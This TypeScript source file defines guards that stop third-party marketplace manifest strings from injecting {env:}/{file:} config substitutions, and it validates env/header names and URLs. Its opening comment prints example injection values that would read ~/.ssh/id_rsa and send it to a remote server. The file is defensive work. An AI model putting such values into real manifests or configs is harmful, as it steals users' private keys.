// Checks every marketplace entry must pass before any of it is written into a user's config.
//
// A marketplace is third-party data fetched from a URL, and config loading is not inert:
// ConfigVariable.substitute runs over the whole config text, keys included, expanding {env:...}
// and then scanning the RESULT for {file:...}. Any manifest string written into config verbatim
// could therefore read a local file at load time -- e.g. a url `https://x/?k={file:~/.ssh/id_rsa}`
// or a header name `X}{file:~/.ssh/id_rsa}` (written as `{env:X}{file:...}`) -- and send it to the
// manifest author's server. Every kind (MCP, skill, hook) goes through these guards; none may
// hand-roll its own.

const SUBSTITUTION = /\{(env|file):/

// Environment variable names as a shell can actually export them. Header names additionally
// allow `-` (`X-Api-Key`); both are allowlists rather than a denylist of characters we thought of.
const ENV_NAME = /^[A-Za-z_][A-Za-z0-9_]*$/
const HEADER_NAME = /^[A-Za-z_][A-Za-z0-9_-]*$/

export function rejectSubstitution(entryName: string, values: readonly (string | undefined)[]) {
  for (const value of [entryName, ...values]) {
    if (value && SUBSTITUTION.test(value)) {
      throw new Error(`Marketplace entry "${entryName}" contains a config substitution token: "${value}"`)
    }
  }
}

// The manifest carries variable NAMES; config wants name -> value. We write `{env:NAME}`, the
// substitution syntax config already supports, so the generated config holds no secret and stays
// safe to commit -- which it would not be had we prompted for values and written them literally.
function references(
  entryName: string,
  names: readonly string[] | undefined,
  pattern: RegExp,
  variable: (name: string) => string,
) {
  if (!names?.length) return undefined
  for (const name of names) {
    if (!pattern.test(name)) {
      throw new Error(`Marketplace entry "${entryName}" declares an invalid environment/header name: "${name}"`)
    }
  }
  return Object.fromEntries(names.map((name) => [name, `{env:${variable(name)}}`]))
}

export function envReferences(entryName: string, names: readonly string[] | undefined) {
  return references(entryName, names, ENV_NAME, (name) => name)
}

// A header name is not always an exportable variable name: no shell can `export X-Api-Key=...`, so
// `{env:X-Api-Key}` would always resolve to "". The header keeps its name; the variable it reads
// is upper-cased with `-` -> `_` (X-Api-Key -> X_API_KEY). HEADER_NAME has already limited the
// input to [A-Za-z0-9_-], so the result can't carry a brace or a second substitution.
export function headerEnvName(name: string) {
  return name.toUpperCase().replaceAll("-", "_")
}

export function headerReferences(entryName: string, names: readonly string[] | undefined) {
  return references(entryName, names, HEADER_NAME, headerEnvName)
}

export function requireHttpUrl(entryName: string, value: string) {
  let url: URL
  try {
    url = new URL(value)
  } catch {
    throw new Error(`Marketplace entry "${entryName}" has an invalid url: "${value}"`)
  }
  if (url.protocol !== "https:" && url.protocol !== "http:") {
    throw new Error(`Marketplace entry "${entryName}" url must be http(s): "${value}"`)
  }
}
